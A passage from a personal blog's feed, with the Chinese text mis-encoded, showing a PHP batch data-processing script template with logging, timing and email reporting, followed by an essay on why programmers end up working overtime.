class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refactorData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $timeStart = microtime(<span class="keyword">true</span>);</span><br><span class="line">        $startDesc = date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">' å¼€å§‹æ‰§è¡Œï¼'</span> . PHP_EOL;</span><br><span class="line">        $logFile = <span class="keyword">__DIR__</span> . <span class="string">'/refactor_data.log'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $startDesc;</span><br><span class="line">        </span><br><span class="line">        file_put_contents($logFile, $startDesc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ•°æ®åˆå§‹åŒ–</span></span><br><span class="line">        $updateData = [];</span><br><span class="line">        $success = $failed = $exception = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $datum) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                $failed++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                file_put_contents(logFile, $datum[<span class="string">'id'</span>] . <span class="string">'ç”±äºxxxæ‰§è¡Œå¤±è´¥'</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                $exception++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                file_put_contents(logFile, $datum[<span class="string">'id'</span>] . <span class="string">'ç”±äºxxxæ— æ³•æ‰§è¡Œ'</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å¤„ç†è„šæœ¬...</span></span><br><span class="line">            file_put_contents($logFile, $datum[<span class="string">'id'</span>] . PHP_EOL, FILE_APPEND);</span><br><span class="line">            $success++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $timeStop = microtime(<span class="keyword">true</span>);</span><br><span class="line">        $endDesc = date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'æ‰§è¡Œç»“æŸï¼'</span> . PHP_EOL;</span><br><span class="line">        file_put_contents($logFile, $endDesc, FILE_APPEND);</span><br><span class="line">        <span class="keyword">echo</span> $endDesc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¼å¼åŒ–æ‰§è¡Œè€—æ—¶</span></span><br><span class="line">        $seconds = round($timeStop - $timeStart, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">switch</span> ($seconds) &#123;</span><br><span class="line">            <span class="keyword">case</span> $seconds &gt; <span class="number">60</span> &amp;&amp; $seconds &lt; <span class="number">3600</span>:</span><br><span class="line">                $elapsed = intval($seconds / <span class="number">60</span>) . <span class="string">'m'</span> . ($seconds % <span class="number">60</span>) . <span class="string">'s'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> $seconds &gt; <span class="number">3600</span> &amp;&amp; $seconds &lt; <span class="number">86400</span>:</span><br><span class="line">                $elapsed = intval($seconds / <span class="number">3600</span>) . <span class="string">'h'</span> . intval($seconds % <span class="number">3600</span> / <span class="number">60</span>) . <span class="string">'m'</span> . ($seconds % <span class="number">60</span>) . <span class="string">'s'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                $elapsed = $seconds . <span class="string">'s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¼å¼åŒ–å†…å­˜å•ä½</span></span><br><span class="line">        $formatStorageUnit = <span class="function"><span class="keyword">function</span> <span class="params">($scale)</span> </span>&#123;</span><br><span class="line">            $gb = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">            $mb = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">            $kb = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">switch</span> ($scale) &#123;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $gb:</span><br><span class="line">                    $humanUnit = round($scale / $gb, <span class="number">2</span>) . <span class="string">'GB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $mb:</span><br><span class="line">                    $humanUnit = round($scale / $mb, <span class="number">2</span>) . <span class="string">'MB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $kb:</span><br><span class="line">                    $humanUnit = round($scale / $kb, <span class="number">2</span>) . <span class="string">'KB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $humanUnit = $scale . <span class="string">'B'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $humanUnit;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $total = <span class="number">999</span>;</span><br><span class="line">        $summary = <span class="string">'=============ç»Ÿè®¡æ‘˜è¦ä¿¡æ¯================'</span> . PHP_EOL .</span><br><span class="line">            <span class="string">'æœ¬æ¬¡å…±éœ€å¤„ç†'</span> . $total . <span class="string">'æ¡æ•°æ®ï¼ŒæˆåŠŸ'</span> . $success . <span class="string">'æ¡ï¼Œå¤±è´¥'</span> . $failed . <span class="string">'æ¡ï¼Œæ— æ³•å¤„ç†'</span> .</span><br><span class="line">            $exception . <span class="string">'æ¡ã€‚'</span> . PHP_EOL . <span class="string">'æ‰§è¡Œè€—æ—¶'</span> . $elapsed . <span class="string">', å†…å­˜æ¶ˆè€—'</span> . $formatStorageUnit(memory_get_usage()) .</span><br><span class="line">            <span class="string">'ï¼Œå†…å­˜æ¶ˆè€—å³°å€¼'</span> . $formatStorageUnit(memory_get_peak_usage()) . PHP_EOL;</span><br><span class="line"></span><br><span class="line">        file_put_contents($logFile, $summary, FILE_APPEND);</span><br><span class="line">        <span class="keyword">echo</span> $summary;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‚®ä»¶é€šçŸ¥æ‰§è¡Œç»“æœ</span></span><br><span class="line">        (<span class="keyword">new</span> Mail())-&gt;sendMail([</span><br><span class="line">            <span class="string">'title'</span>    =&gt; <span class="string">'xxxè„šæœ¬æ‰§è¡Œå®Œæˆ'</span>,</span><br><span class="line">            <span class="string">'body'</span>     =&gt; $summary,</span><br><span class="line">            <span class="string">'receiver'</span> =&gt; <span class="string">'mail@example.com'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="comment">// é‚®ä»¶é€šçŸ¥æ‰§è¡Œç»“æœ</span></span><br><span class="line">        (<span class="keyword">new</span> Mail())-&gt;sendMail([</span><br><span class="line">            <span class="string">'title'</span>    =&gt; <span class="string">'xxxè„šæœ¬æ‰§è¡Œå¤±è´¥'</span>,</span><br><span class="line">            <span class="string">'body'</span>     =&gt; <span class="string">'æ‰§è¡Œå¤±è´¥ï¼Œé”™è¯¯åŸå› ï¼š'</span> . $e-&gt;getMessage(),</span><br><span class="line">            <span class="string">'receiver'</span> =&gt; <span class="string">'mail@example.com'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®å‰å°±æ˜¯è¿™äº›äº†ï¼Œå†æœ‰æ–°çš„ç»éªŒéšæ—¶è¡¥å……:)</p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ—¶é—´é»‘æ´</title>
      <link href="/post/time-blackhole/"/>
      <url>/post/time-blackhole/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87b8wwj7yj30q40b8myo.jpg" alt=""></p><a id="more"></a><p>ä¸ºä»€ä¹ˆä½ æ€»åœ¨åŠ ç­ï¼Ÿä¸ºä»€ä¹ˆä½ ä¸‹ç­åèº«å¿ƒä¿±ç–²ï¼Œä½†åˆæ„Ÿè§‰ä¸€å¤©æ²¡åšä»€ä¹ˆï¼Ÿä½ çš„æ—¶é—´éƒ½å»å“ªå„¿äº†ï¼Ÿå¦‚ä½•æ‰èƒ½æ—©ç‚¹ä¸‹ç­å›å®¶ï¼Ÿä»Šå¤©ï¼Œæˆ‘ä»¬æ¥æ¢è®¨ä¸€ä¸‹è¿™ä¸ªå¦‚ä»Šéå¸¸æ™®éç°è±¡èƒŒåçš„åŸå› ã€‚</p><h1 id="åŠå…¬ç¯å¢ƒ"><a href="#åŠå…¬ç¯å¢ƒ" class="headerlink" title="åŠå…¬ç¯å¢ƒ"></a>åŠå…¬ç¯å¢ƒ</h1><p>ä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰è¿™æ ·çš„ç»å†ï¼šä½ çš„æ—è¾¹æ˜¯ç”µè¯é”€å”®æˆ–è€…å”®åæœåŠ¡ï¼Œå½“ä½ å‡†å¤‡å°†æ„æ€å¥½çš„ä¸€æ®µä»£ç å†™ä¸‹æ¥æ—¶ï¼Œä»–ä»¬çš„ä¸€é€šç”µè¯è®©ä½ çš„æ„æ€åƒè¢«ä¸€é˜µé¾™å·é£è¢­å‡»ä¸€æ ·ï¼Œå†ä¹Ÿæƒ³ä¸èµ·æ¥ã€‚ä½ æ„Ÿè§‰è‡ªå·±å°±åƒç½®èº«äºèœå¸‚åœºä¸€æ ·ï¼Œæ ¹æœ¬æ— æ³•å†™å‡ºä»€ä¹ˆåƒæ ·çš„ä»£ç ã€‚</p><p>ç°åœ¨å¼€æ”¾å¼åŠå…¬è¶Šæ¥è¶Šå—æ¬¢è¿ï¼Œçœ‹èµ·æ¥ä¼¼ä¹è®©åŒäº‹é—´çš„æ²Ÿé€šæ›´åŠ çš„é«˜æ•ˆã€åŒäº‹çš„å…³ç³»ä¹Ÿæ›´åŠ èæ´½ï¼Œä½†äº‹å®å´æ˜¯ä½ ç»å¸¸è¢«æ—è¾¹åŒäº‹ä¸ä»–äººçš„è®¨è®ºæ‰“æ‰°ï¼Œå¿å—ç€è§†è§‰ä¸å¬è§‰çš„æ±¡æŸ“ï¼Œè®©ä½ æ— æ³•é›†ä¸­æ³¨æ„åŠ›ã€‚åŸæœ¬åŠå°æ—¶å°±å¯ä»¥å®Œæˆçš„ä»»åŠ¡ï¼Œä½ éœ€è¦ç»å¸¸åœä¸‹æ¥é‡æ–°æ‹ä¸€ä¸‹æ€è·¯ï¼Œä½ èŠ±è´¹äº†æ›´é•¿çš„æ—¶é—´æ¥å®Œæˆä»»åŠ¡ï¼Œè´¨é‡è¿˜æ‰“äº†æŠ˜æ‰£ã€‚</p><p>å¼€æ”¾å¼åŠå…¬ä¸æ ¼å­é—´åŠå…¬å„æœ‰åˆ©å¼Šï¼Œå‰è€…æ›´ä¾¿äºæ²Ÿé€šï¼Œè®©å‘˜å·¥æ— æ³•åœ¨ä¸Šç­æ—¶é—´å¨±ä¹ï¼›åè€…ç»™å‘˜å·¥ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„ç©ºé—´ï¼Œèƒ½æ›´åŠ ä¸“æ³¨é«˜æ•ˆå¤„ç†äº‹ä»¶ã€‚äºŒè€…ä¼¼ä¹éš¾ä»¥æŠ‰æ‹©ï¼Œæ­£å¦‚æ²¡æœ‰æœ€å¥½çš„æ–¹å¼ï¼Œåªæœ‰åˆé€‚çš„æ–¹å¼ä¸€æ ·ï¼Œå¯ä»¥ä¸ºå‘˜å·¥æä¾›ä¸¤ç§åŠå…¬ç¯å¢ƒï¼Œè®©å‘˜å·¥è‡ªç”±é€‰æ‹©ã€‚å¦‚æœé‡‡ç”¨å¼€æ”¾å¼åŠå…¬åªæ˜¯ä¸ºäº†é˜²æ­¢å‘˜å·¥ä¸Šç­â€œæ‘¸é±¼â€ï¼Œä½ æˆ–è®¸åº”è¯¥æ”¹å–„çš„æ˜¯æ‹›è˜æ ‡å‡†ï¼Œè€Œä¸æ˜¯è®©å·¥ä½œæ•ˆç‡é™ä½çš„å·¥ä½œç¯å¢ƒã€‚</p><h1 id="ä¼šè®®"><a href="#ä¼šè®®" class="headerlink" title="ä¼šè®®"></a>ä¼šè®®</h1><p>ä½ å¯èƒ½ä¹Ÿæœ‰è¿‡è¿™æ ·çš„ç»å†ï¼šè¢«é‚€è¯·å‚åŠ ä¸€ä¸ªä¼šè®®ï¼Œè¿›å»ä¹‹åå‘ç°å¾ˆå¤šçš„å‚ä¼šè€…ï¼Œè®¤çœŸå¬äº†ä¸€ä¼šå„¿åï¼Œå‘ç°ä¼¼ä¹å’Œä½ æ²¡æœ‰ä»€ä¹ˆå…³ç³»ã€‚å½“ä½ æ­£æƒ³çœ‹ä¸€ä¸‹ä¹‹å‰æ”¶è—çš„åšå®¢æ—¶ï¼Œåˆçªç„¶è¢«æé—®ã€‚çœ¼çœ‹ä¼šè®®å®¤æ—¶é—´å°±è¦åˆ°äº†ï¼Œç»„ç»‡è€…ä¼¼ä¹å¯¹æœ¬åœºä¼šè®®ä¸æ˜¯å¾ˆæ»¡æ„ï¼Œåˆçº¦å®šä¸¤å¤©åç»§ç»­è®¨è®ºã€‚</p><p>æ¯«æ— ç–‘é—®ï¼Œä¼šè®®æ˜¯ä¸€ç§é«˜æˆæœ¬çš„é«˜æ•ˆæ²Ÿé€šæ–¹å¼ï¼Œä½†å¾ˆå¤šäººå°†è¿™ç§æ²Ÿé€šæ–¹å¼æ»¥ç”¨ï¼Œåè€Œæµªè´¹äº†å¾ˆå¤šçš„æ—¶é—´ã€‚å› æ­¤ï¼Œè¿™ç§å½¢å¼éœ€è¦ç»„ç»‡è€…åœ¨ä¼šå‰è®¤çœŸåšå¾ˆå¤šå‡†å¤‡å·¥ä½œï¼Œå¦‚ï¼šæ˜ç¡®ä¼šè®®ä¸»é¢˜ã€å¿…è¦ä¸ä¼šäººå‘˜ã€å‚ä¼šè€…ä¼šè®®å‰éœ€è¦äº†è§£çš„å†…å®¹ã€ä¼šè®®æ‰€è¦è¾¾åˆ°çš„æ•ˆæœç­‰ã€‚</p><h1 id="éœ€æ±‚è¯„ä¼°"><a href="#éœ€æ±‚è¯„ä¼°" class="headerlink" title="éœ€æ±‚è¯„ä¼°"></a>éœ€æ±‚è¯„ä¼°</h1><p>äº§å“éœ€æ±‚çš„åˆç†æ€§ï¼Œéœ€æ±‚ä¸ç³»ç»Ÿé—´çš„å¹³è¡¡ï¼ŒæŠ•å…¥äº§å‡ºæ¯”ç­‰ï¼Œè¿™æ˜¯æˆ‘ä»¬æ¯ä¸ªå¼€å‘è€…åœ¨éœ€æ±‚è¯„ä¼°æ—¶éƒ½éœ€è¦è€ƒè™‘çš„é—®é¢˜ã€‚äº§å“ç»ç†ä¸å¼€å‘è€…åº”è¯¥ç«™åœ¨å„è‡ªçš„è§’åº¦è¯„ä¼°éœ€æ±‚ï¼Œå¹¶ç»™å‡ºåˆç†çš„è§£é‡Šã€‚å¯¹äºé‚£äº›æ”¶ç›Šè¾ƒå°‘ï¼Œä½†ä¼šå¯¹ç³»ç»Ÿç¨³å®šåŠç»´æŠ¤é€ æˆå¾ˆå¤§å†²å‡»çš„éœ€æ±‚ï¼Œè¯·ä¸¥è¾æ‹’ç»ï¼Œå¦‚æœäº§å“ç»ç†ç”¨é¢†å¯¼å‘ä½ æ–½å‹ï¼Œè€Œé¢†å¯¼åˆæ— æ³•ç»™å‡ºä»¤äººä¿¡æœçš„ç†ç”±ï¼Œä½ æˆ–è®¸åº”è¯¥è€ƒè™‘æ¢ä¸€ä¸ªå›¢é˜Ÿäº†ã€‚</p><p><strong>ä¸€ä¸ªç•¸å½¢çš„éœ€æ±‚ä¼šåƒæ ¸è¾å°„ä¸€æ ·æ±¡æŸ“æ•´ä¸ªé¡¹ç›®</strong>ã€‚åˆ°æ—¶ä½ ä¸å¾—ä¸æ¯å¤©å……å½“æ•‘ç«é˜Ÿå‘˜ï¼Œå³ä½¿åœ¨ä¸‹ç­æ—¶é—´ä¹Ÿä¼šå¸¸å¸¸æ”¶åˆ°æŠ¥è­¦æé†’ã€‚</p><p>å¦‚æœä½ è¯„ä¼°åè®¤ä¸ºéœ€æ±‚åˆç†ï¼Œä½†äº§å“è¦æ±‚ä½ 3å¤©å®Œæˆä¸€ä¸ªä¸å¯èƒ½å®Œæˆçš„ä»»åŠ¡ï¼Œè¯·ä¸è¦é«˜ä¼°è‡ªå·±çš„èƒ½åŠ›ï¼Œè¯´æ˜ä½ çš„çœŸå®æƒ…å†µã€‚è¦ä¹ˆå»¶é•¿å¼€å‘æ—¶é—´ï¼Œè¦ä¹ˆå¢åŠ äººæ‰‹ã€‚è¯´æ˜è‡ªå·±åœ¨ä¸å¯èƒ½çš„æ—¶é—´å®Œæˆä»»åŠ¡å¹¶ä¸ä¸¢äººï¼Œæ‰¿è¯ºå¤±ä¿¡æ‰æ›´åŠ ä¸¢äººã€‚</p><h1 id="æ‹¼å‡‘ä»£ç "><a href="#æ‹¼å‡‘ä»£ç " class="headerlink" title="æ‹¼å‡‘ä»£ç "></a>æ‹¼å‡‘ä»£ç </h1><p>ä½ ç¼–ç¨‹çš„æ–¹å¼æ˜¯ä¸æ˜¯åœ¨ä¸åœçš„è¯•éªŒï¼Œå¯»æ‰¾ä¸€ç§çœ‹ä¸Šå»èƒ½å·¥ä½œçš„ç»„åˆï¼Ÿå³ä½¿ä½ è¿™æ ·éšæ„çš„å¼€å‘è¿‡ç¨‹èƒ½å¤Ÿäº§ç”Ÿå‡ºä¸€ä¸ªæ­£ç¡®çš„ç¨‹åºï¼Œä½†ä½ çœŸçš„æ¸…æ¥šä½ å†™çš„ä»£ç æ˜¯å¦‚ä½•è¿è¡Œçš„å—ï¼Ÿæ¸…æ¥šå…¶ä¸­æ‰€éšè—çš„ bug å—ï¼Ÿä½ éœ€è¦çœŸæ­£ç†è§£ä½ çš„ä»£ç æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè€Œä¸æ˜¯ççŒœã€‚</p><p>ç›¸æ¯”ä¸æ‹¼å‡‘ä»£ç çš„ç¨‹åºå‘˜ï¼Œä¼˜ç§€ç¨‹åºå‘˜ä¼šé¦–å…ˆç†è§£éœ€æ±‚ï¼Œç„¶ååœ¨è„‘æµ·ä¸­æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œï¼Œå†å°†æ‰§è¡Œè¿‡ç¨‹ç”¨ä¼ªä»£ç çš„æ–¹å¼è®°å½•ä¸‹æ¥ï¼Œæ£€ç´¢é€»è¾‘æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œæ˜¯å¦æœ‰å€¼å¾—ä¼˜åŒ–çš„åœ°æ–¹ã€‚å½“ä»–ä»¬ç¡®å®šå¥½ä¹‹åï¼Œå†è½¬æ¢ä¸ºä»£ç è¯­è¨€ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä»–ä»¬ç”¨80%çš„æ—¶é—´æ€è€ƒï¼Œç”¨20%çš„æ—¶é—´å†™å‡ºé«˜è´¨é‡çš„ä»£ç ï¼Œè€Œä»–ä»¬å¤§å¤šæ•°æ—¶é—´çœ‹èµ·æ¥å¹¶ä¸æ˜¯é‚£ä¹ˆå¿™ã€‚ä»–ä»¬ç”¨ä¼ªä»£ç æ¥æ£€æŸ¥è‡ªå·±çš„æ•´ä¸ªä»£ç ï¼Œä¹Ÿç¡®ä¿è‡ªå·±åœ¨ç¼–å†™ä»£ç è¿‡ç¨‹ä¸­ä¸ä¼šèµ°åè€Œæµªè´¹æ—¶é—´ã€‚</p><p>åœ¨ç¼–å†™å®Œæˆåï¼Œå·®çš„ç¨‹åºå‘˜è‡ªå·±è·‘ä¸€éä»£ç å°±æäº¤ç»™æµ‹è¯•ï¼Œè€Œä¼˜ç§€çš„ç¨‹åºå‘˜ä¼šé‡æ–°å®¡è§†è‡ªå·±åˆšå†™çš„ä»£ç ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­åˆèƒ½å‘ç°80%çš„é”™è¯¯ï¼Œè¯¸å¦‚æ‹¼å†™é”™è¯¯ï¼Œåˆ¤æ–­è¾¹ç•Œæ¡ä»¶ç­‰ã€‚ä¸ç»å®¡è§†çš„ä»£ç åœ¨æµ‹è¯•åæ”¶åˆ°ä¸€å¤§å †çš„é—®é¢˜åé¦ˆï¼Œå¦‚éœ€æ±‚ä¸ç¬¦ï¼Œæ•°æ®æ˜¾ç¤ºé”™è¯¯ç­‰æ˜¾è€Œæ˜“è§çš„é—®é¢˜ï¼Œåœ¨æ¥å›åé¦ˆé—®é¢˜ã€å¤„ç†é—®é¢˜çš„æ²Ÿé€šä¸­ï¼Œæ—¶é—´åˆåœ¨ä¸çŸ¥ä¸è§‰é—´æ¥åˆ°äº†ä¸‹ç­æ—¶é—´ï¼Œä½†ç°åœ¨çš„é—®é¢˜è¿˜å¾ˆå¤šï¼Œæ„å‘³ç€ä½ ä»Šæ™šè¦åŠ ç­è§£å†³äº†ã€‚</p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°å¥½çš„å¼€å‘è¿‡ç¨‹å¹¶ä¸ä¼šæå‡ä½ çš„å·¥ä½œæ—¶é—´å’Œå·¥ä½œé‡ï¼Œåè€Œä¼šè®©ä½ æ›´æ—©ä¸‹ç­ï¼Œå®‰å¿ƒä¼‘æ¯ã€‚</p><ul><li>è®¤çœŸè¯„ä¼°ä¸ç†è§£éœ€æ±‚</li><li>ç”¨ä¼ªä»£ç æ£€æŸ¥å¯è¡Œæ€§ä¸å¸¸è§é—®é¢˜</li><li>å°†ä¼ªä»£ç è½¬æ¢ä¸ºç¼–ç¨‹è¯­è¨€</li><li>å®¡è§†è‡ªå·±çš„ä»£ç ï¼Œä½ é€šå¸¸èƒ½æ‰¾åˆ°80%çš„é”™è¯¯ï¼Œä»è€ŒèŠ‚çœå¤§é‡æ—¶é—´</li></ul><h1 id="è°ƒè¯•-bug"><a href="#è°ƒè¯•-bug" class="headerlink" title="è°ƒè¯• bug"></a>è°ƒè¯• bug</h1><p>ä½ å¯èƒ½åœ¨å·¥ä½œä¸­ç»å¸¸ä¼šå¬åˆ°è¿™æ ·çš„è¯ï¼š</p><ul><li>è¿™é—®é¢˜ä¸å¯èƒ½æ˜¯æˆ‘çš„ï¼Œæˆ‘ä»€ä¹ˆä¹Ÿæ²¡æ”¹</li><li>æ˜¨å¤©è¿˜å¥½å¥½çš„ï¼Œæ€ä¹ˆä»Šå¤©çªç„¶å°±ä¸è¡Œäº†å‘¢ï¼Ÿ</li><li>æˆ‘æœ¬åœ°è·‘çš„å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆä¸€åˆ°çº¿ä¸Šå°±ä¸è¡Œäº†ï¼Ÿ</li></ul><p>è¦çŸ¥é“ï¼Œå¦‚æœä½ å†™çš„ç¨‹åºå‡ºäº†é—®é¢˜ï¼Œé‚£å°±æ˜¯ä½ çš„åŸå› ï¼Œä¸æ˜¯è®¡ç®—æœºçš„ï¼Œä¹Ÿä¸æ˜¯ç¼–è¯‘å™¨çš„ã€‚ç¨‹åºä¸ä¼šæ¯æ¬¡éƒ½äº§ç”Ÿä¸åŒçš„ç»“æœã€‚å®ƒä¸æ˜¯è‡ªå·±å†™å‡ºæ¥çš„ï¼Œæ˜¯ä½ å†™çš„ï¼Œæ‰€ä»¥ï¼Œè¯·å¯¹å®ƒè´Ÿè´£ã€‚</p><p>æˆ‘ä»¬å¯èƒ½è¿˜ä¼šåœ¨å·¥ä½œä¸­é‡åˆ°è¿™æ ·çš„ä¸€ç§äººï¼š</p><ul><li>æŸ¥æ‰¾bugæ—¶ä¸åœçš„åœ¨ç¨‹åºä¸­æ•£å¸ƒ<code>print</code>ï¼Œå¦‚æœ<code>print</code>æ²¡æœ‰æ‰¾åˆ°åŸå› ï¼Œé‚£å°±éšä¾¿ä¿®æ”¹ç‚¹ä»€ä¹ˆï¼Œè®©ç¨‹åºçœ‹èµ·æ¥å¥½åƒæ­£å¸¸äº†</li><li>å‡ºç°çš„é—®é¢˜ä¸å€¼ä¸€æï¼Œè¦è§£å†³å®ƒä»¬å¹¶ä¸éœ€è¦å½»åº•å¼„æ‡‚ç¨‹åºã€‚åªè¦èƒ½è®©ç¨‹åºçœ‹èµ·æ¥æ­£å¸¸è¿è¡Œå°±è¡Œäº†</li><li>ä¸éœ€è¦é‡å†™è¿™æ®µè‡ªå·±ä¸¤ä¸ªæœˆå‰çš„çƒ‚ä»£ç ï¼Œåªè¦èƒ½è®©è¿™æ®µç¨‹åºè·‘èµ·æ¥å°±è¡Œ</li></ul><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæŸ¥æ‰¾å¹¶ç†è§£ bug é€šå¸¸å ç”¨äº†æ•´ä¸ªè°ƒè¯•å·¥ä½œçš„ 90%ã€‚å› æ­¤ï¼Œå¦‚æœä½ å·²ç»åœ¨æŸ¥æ‰¾ bug ä¸­èŠ±è´¹äº†å¤ªå¤šçš„æ—¶é—´ï¼Œä½ æˆ–è®¸åº”è¯¥ä¼˜åŒ–ä½ çš„å¼‚å¸¸å¤„ç†ï¼Œèƒ½å¤Ÿå¿«é€Ÿå®šä½åˆ°é—®é¢˜æ‰€åœ¨ï¼›ä¹Ÿåº”è¯¥ä¼˜åŒ–ä½ çš„ä»£ç ï¼Œä¸è¦è®©é‚£äº›éš¾ä»¥é˜…è¯»çš„ä»£ç èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚æ²»æ ‡ä¸æ²»æœ¬çš„é—®é¢˜å¤„ç†æ–¹å¼åŒæ ·ä¼šè®©ä½ å’Œè¿™ä¸ªé—®é¢˜çº ç¼ åœ¨ä¸€èµ·ï¼Œæµªè´¹æ›´å¤šçš„æ—¶é—´ï¼Œ</p><h1 id="è´¨é‡"><a href="#è´¨é‡" class="headerlink" title="è´¨é‡"></a>è´¨é‡</h1><p>ä¸è®©è‹è‡çƒ¦æ‰°ä½ çš„æœ€å¥½æ–¹å¼å°±æ˜¯æ¶ˆç­è‹è‡ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é«˜è´¨é‡æ¥å‡å°‘æˆ‘ä»¬åœ¨ bug ä¸­æ‰€èŠ±è´¹çš„å¤§é‡æ—¶é—´ã€‚è€Œè´¨é‡ä¿éšœåœ¨é¡¹ç›®ä¸­åˆæ˜¯ä¸€ä¸ªè®¾è®¡é¢å¾ˆå¹¿æ³›çš„è¯é¢˜ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯é˜…è¯»ã€Šä»£ç å¤§å…¨ã€‹ç­‰ç»å…¸ä¹¦ç±ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹æˆ‘çš„<a href="http://blog.shixinyu.space/2019/09/28/%E3%80%90%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E3%80%91%E3%80%8A%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8%E3%80%8B/">ã€Šä»£ç å¤§å…¨ã€‹ç¬”è®°</a>ã€‚</p><p>è½¯ä»¶è´¨é‡å¤§ä½“åŒ…æ‹¬ä»¥ä¸‹æ–¹é¢ï¼š</p><ul><li>éœ€æ±‚è°ƒç ”</li><li>äº§å“è®¾è®¡</li><li>æŠ€æœ¯æ¶æ„(æ˜¯å¦åŒ…å«å–æ‚¦è€æ¿çš„éƒ¨åˆ†ï¼Ÿ)</li><li>é¡¹ç›®å®æ–½äººå‘˜é…ç½®(ã€Šäººæœˆç¥è¯ã€‹)</li><li>æ•°æ®è¡¨è®¾è®¡</li><li>å¼€å‘è§„èŒƒ<ul><li>é«˜è´¨é‡çš„ç±»</li><li>é«˜è´¨é‡çš„å­ç¨‹åº</li><li>é˜²èŒƒå¼ç¼–ç¨‹</li></ul></li><li>è´¨é‡ä¿éšœæ˜¯å¦å…¨ç¨‹å…³æ³¨</li><li>è‡ªåŠ¨åŒ–æµ‹è¯•</li><li>bug è¿½è¸ª</li><li>bug 